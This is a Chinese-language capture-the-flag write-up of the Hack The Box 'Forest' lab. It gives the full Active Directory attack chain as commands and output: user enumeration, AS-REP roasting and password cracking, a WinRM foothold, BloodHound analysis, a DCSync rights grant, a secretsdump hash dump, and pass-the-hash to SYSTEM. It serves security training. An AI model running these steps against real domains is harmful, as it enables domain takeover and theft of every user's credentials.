# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责

# 服务探测
查看开放端口
```
┌──(root💀kali)-[~/htb/Forest]
└─# nmap -p- 10.10.10.161 --open               
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-04 08:31 EST
Nmap scan report for 10.10.10.161
Host is up (0.25s latency).
Not shown: 65364 closed ports, 147 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49706/tcp open  unknown
49928/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 130.98 seconds

```

查看详细信息
```
└─# nmap -sV -T4 -A -O 10.10.10.161 -p 53,88,135,139,389,445,464,593,636,3268,3269,585,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49706,49928
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-04 08:35 EST
Nmap scan report for 10.10.10.161
Host is up (0.22s latency).

PORT      STATE  SERVICE      VERSION
53/tcp    open   domain       Simple DNS Plus
88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2022-01-04 13:42:21Z)
135/tcp   open   msrpc        Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open   tcpwrapped
445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
9389/tcp  open   mc-nmf       .NET Message Framing
47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open   unknown
49665/tcp open   unknown
49666/tcp open   unknown
49667/tcp open   msrpc        Microsoft Windows RPC
49671/tcp open   unknown
49676/tcp open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open   msrpc        Microsoft Windows RPC
49684/tcp open   msrpc        Microsoft Windows RPC
49706/tcp open   msrpc        Microsoft Windows RPC
49928/tcp open   msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=1/4%OT=53%CT=585%CU=39064%PV=Y%DS=2%DC=T%G=Y%TM=61D44D
OS:B8%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=I%CI=I%TS=A)SEQ(SP=
OS:103%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS=A)OPS(O1=M505NW8ST11%O2=M505NW8
OS:ST11%O3=M505NW8NNT11%O4=M505NW8ST11%O5=M505NW8ST11%O6=M505ST11)WIN(W1=20
OS:00%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M5
OS:05NW8NNS%CC=Y%Q=)ECN(R=N)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%D
OS:F=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O
OS:=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
OS:T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%U
OS:N=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h46m51s, deviation: 4h37m10s, median: 6m49s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2022-01-04T05:43:43-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-01-04T13:43:42
|_  start_date: 2022-01-04T13:34:03

TRACEROUTE (using port 585/tcp)
HOP RTT       ADDRESS
1   257.15 ms 10.10.14.1
2   257.26 ms 10.10.10.161

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 162.40 seconds

```

显然是一台DC服务器，域名是：```htb.local```,机器名字：```FOREST```

先把域名加到host文件
```
echo "10.10.10.161  htb.local" >> /etc/hosts

```

使用rpcclient匿名登录靶机，枚举所有域用户
```
┌──(root💀kali)-[~/htb/Forest]
└─#  rpcclient -U "" -N 10.10.10.161                                                                           130 ⨯
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
rpcclient $> 

```

整理成一份user名单
```
Administrator
Guest
krbtgt
DefaultAccount
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

使用```GetNPUsers.py```尝试向kerberos请求不需要预认证的票据
```
┌──(root💀kali)-[~/htb/Forest]
└─# python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py htb.local/ -usersfile /root/htb/Forest/user  -outputfile hashes.asreproast -dc-ip 10.10.10.161
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set

```


得到一个票据
```
┌──(root💀kali)-[~/htb/Forest]
└─# cat hashes.asreproast 
$krb5asrep$23$svc-alfresco@HTB.LOCAL:25119f5d1377a724caa46729ed033266$371a8d9e8f8913675cc79afc8e2e233a99fb375f45967e9999c7f3cd04c5cfdd427c52ebde622f0afe9a2a60f9c20bcac9bf8ac53807cf082eccef75b850ae3f07281f22bba083b10b97ea4a4bb7266618a1cbf92db7168d034789e3c5da54fec6adfbef667fbeff8d649f0c8b49183bf7bc188385e2e4589d482a1104787e1a079949cdc54a472a0a5ff79b59100a7a3c815830711404e829e7e3b9b984ffae71d7ab38a2ee88e5dc8916d8b28d63240d97c7e59daac9e8155ee13e64878ff9f7bf6d648d502f4d9ab3589faf4835ac659c315ff0e512a0104da788e586b07a46158b6e90b7

```


john爆破
```
┌──(root💀kali)-[~/htb/Forest]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:03 DONE (2022-01-04 11:12) 0.2985g/s 1219Kp/s 1219Kc/s 1219KC/s s401447401447401447..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```


现在我们有了一个凭证：```svc-alfresco : s3rvice```

使用evil-winrm登录，拿到foodhold
```
┌──(root💀kali)-[~/htb/Forest]
└─# evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco

```

# 提权

## bloodhound

由于这是一台DC服务器，我们用bloodhound分析域里面的权限关系。

开启neo4j
```neo4j console```

开启bloodhound
```bloodhound --no-sandbox```

把SharpHound.ps1传到靶机，执行：
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Import-Module C:\Users\svc-alfresco\Documents\SharpHound.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Invoke-Bloodhound -CollectionMethod All -Domain htb.local -LDAPUser "svc-alfresco" -LDAPPass "s3rvice"
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> ls


    Directory: C:\Users\svc-alfresco\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         1/5/2022   7:04 AM          15528 20220105070402_BloodHound.zip
-a----         1/5/2022   7:04 AM          23725 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
-a----         1/5/2022   7:02 AM         973732 SharpHound.ps1



```

把20220105053344_forest.zip从靶机下载到kali
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> download 20220105053344_forest.zip
Info: Downloading 20220105053344_forest.zip to ./20220105053344_forest.zip

                                                             
Info: Download successful!

```

把20220105053344_forest.zip导入到bloodhound

[这里是图片]

## 分析

可以看到svc-alfresco 是 Service Accounts 的成员
svc-alfresco同时还是 Privileged IT Accounts的成员
另外，Privileged IT Accounts 是 Account Operators 的成员

Account Operators对 Exchange Windows Permissions 有 GenericAll权限

何谓GenericAll权限?
bloodhound里的help手册说明如下:
>The members of the group ACCOUNT OPERATORS@HTB.LOCAL have GenericAll privileges to the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL.This is also known as full control. This privilege allows the trustee to manipulate the target object however they wish.


可以理解可以添加域用户，为域用户赋予各种权限，我们主要的攻击点就是svc-alfresco通过一连串组继承，拥有```Exchange Windows Permissions```的权限

所以这里的攻击思路是，给用户赋予DCSync的权限，然后利用secretsdump.py导出所有用户哈希。


我们可以把```svc-alfresco```添加到```Exchange Windows Permissions```，也可以新创建一个用户（我们有创建域用户的权限），再把用户添加进```Exchange Windows Permissions```
为了不影响其他使用这台靶机的人员，我们选择新创建用户，步骤如下：


1. 添加一个域用户```max```，密码是：```max@123456 ```
```net user max max@123456 /add /domain```

2. 把用户```max```添加进```Exchange Windows Permissions```组里
```net group "Exchange Windows Permissions" /add max```

3. 以下操作需要先引入 PowerView.ps1，可以在evil-winrm登录的时候指定-s参数引入，也可以把PowerView.ps1下载到本地
```
$pass = convertto-securestring 'max@123456' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('htb\max', $pass)
```
4. 把```DCSync```的权限赋予域用户```max```
```Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity max -Rights DCSync```


操作如下
```
 ┌──(root💀kali)-[~/htb/Forest]
└─# evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' -s '/root/PowerSploit/Recon'

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> PowerView.ps1

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user max max@123456 /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" /add max
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $pass = convertto-securestring 'max@123456' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $cred = New-Object System.Management.Automation.PSCredential ('htb\max', $pass)
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity max -Rights DCSync
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 

 ```

现在我们已经有了DCSync的权限，可以使用secretsdump.py导出所有用户哈希，下面我只截取有有的信息

```
 ┌──(root💀kali)-[~/htb/Forest]
└─# python3 /root/impacket-master/examples/secretsdump.py htb.local/max:max@123456@10.10.10.161
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
max:9602:aad3b435b51404eeaad3b435b51404ee:673903f73003b16a501666b84cd5b5b2:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:f88cc1cc5cd65ffa5e5913f523e71c7d:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
max:aes256-cts-hmac-sha1-96:25aa82b805321fc6545d7ee4b79927f1a24ab7aab8588d33e2cbc1ad38a3bca9
max:aes128-cts-hmac-sha1-96:5aba96d6b256c93a03357a7d00feb097
max:des-cbc-md5:01b51a7cdf5b02e3
FOREST$:aes256-cts-hmac-sha1-96:f8854f2d9bcba373fadd9e70667f06dc8fbbe13bab37748aafacbf3b033e0060
FOREST$:aes128-cts-hmac-sha1-96:28cbc2a0189779ca67c3877908e70898
FOREST$:des-cbc-md5:4a8649d0da2a4f8c
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up... 

```
看到爆出了```Administrator```的哈希
```
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```
 
现在我们可以利用pass-the-hash

使用evil-winr登录
```
┌──(root💀kali)-[~/htb/Forest]
└─# evil-winrm -i 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator

```

或者smbexec.py
```
┌──(root💀kali)-[~/htb/Forest]
└─# python3 /usr/share/doc/python3-impacket/examples/smbexec.py Administrator@10.10.10.161 -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>

```

或者psexec.py
```
┌──(root💀kali)-[~/htb/Forest]
└─# python3 /usr/share/doc/python3-impacket/examples/psexec.py htb/Administrator@10.10.10.161  -hashes "32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6"

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file qJuKKMlK.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service Tifk on 10.10.10.161.....
[*] Starting service Tifk.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

# 总结
这台学到很多活动目录的东西，foodhold非常容易，提权我花了整整一天查各种资料才稍微明白是怎么回事
bloodhound里点击```Find AS-REP Roastable Users (DontReqPreAuth)```会显示只有一个用户svc-alfresco，这也是为什么我们一开始可以用GetNPUsers.py拿到svc-alfresco哈希信息的原因，因为只有svc-alfresco开启了不需要kerberos预身份验证。
